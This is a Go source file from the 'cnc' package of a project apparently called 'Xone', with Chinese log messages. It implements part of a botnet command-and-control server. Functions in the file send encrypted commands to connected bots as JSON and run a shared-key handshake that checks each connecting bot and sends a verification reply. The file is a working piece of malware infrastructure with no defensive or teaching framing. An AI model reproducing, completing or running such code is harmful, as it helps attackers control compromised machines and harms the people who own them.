package cnc

import (
	"Xone/utils"
	"encoding/json"
	"fmt"
	"net"
)

type BotVerify struct {
	Verify string `json:"0"`
}
type BotVerifyCallback struct {
	VerifyCallback string `json:"1"`
}
type Command struct {
	Cmd string `json:"3"`
}

func CmdMessage(conn net.Conn, c string) {
	x0 := utils.MessageCrypt(c)
	x1 := Command{Cmd: x0}
	x2, err := json.Marshal(x1)
	if err != nil {
		fmt.Println(err)
	}
	_, err = conn.Write(x2)
	if err != nil {
		fmt.Println(err)
	}
}

func (b *BotInfo) BotVerify() bool {
	buf := make([]byte, 4096)
	var msg BotVerify
	for {
		n, err := b.Conn.Read(buf)
		if err != nil {
			fmt.Println("[-]验证客户端读取密钥错误 -->", err)
			b.ExitChan <- true
			return false
		}
		str := jsonDecoding(msg, buf, n)
		if str != b.BotsVerify {
			b.ExitChan <- true
			fmt.Println("[-]", b.Conn.RemoteAddr(), "连接验证失败")
			return false
		} else {
			if b.BotVerifyCallback() != true {
				b.ExitChan <- true
				return false
			}

			return true
		}
	}
}

func (b *BotInfo) BotVerifyCallback() bool {

	rep := BotVerifyCallback{VerifyCallback: b.BotsVerifyCallback}
	marshal, err := json.Marshal(rep)
	if err != nil {
		fmt.Println("[-]字符转json失败 -->", err)
		return false
	}
	_, err = b.Conn.Write(marshal)
	if err != nil {
		fmt.Println("[-]Bot验证回拨失败 -->", err)
		return false
	}
	return true
}
